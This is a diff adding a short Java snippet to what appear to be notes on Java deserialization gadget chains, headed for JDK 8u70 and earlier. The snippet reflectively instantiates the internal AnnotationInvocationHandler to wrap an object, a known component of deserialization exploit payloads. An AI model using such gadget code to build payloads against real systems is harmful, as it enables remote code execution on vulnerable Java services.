@@ -51,6 +51,21 @@
 ```
 
 
+### annotationhander ->tostring (<=8U70,)
+
+```java
+ public static Object annotationhander2compare(Object o) throws Exception {
+HashMap<Object, Object> map1 = new HashMap<>();
+map1.put("value",o);
+Class<?> AnnotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor<?> Anotationdeclared = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
+Anotationdeclared.setAccessible(true);
+InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Target.class, map1);
+return h;
+ }
+```
+
+
 
 ###  treebag—>compare
 
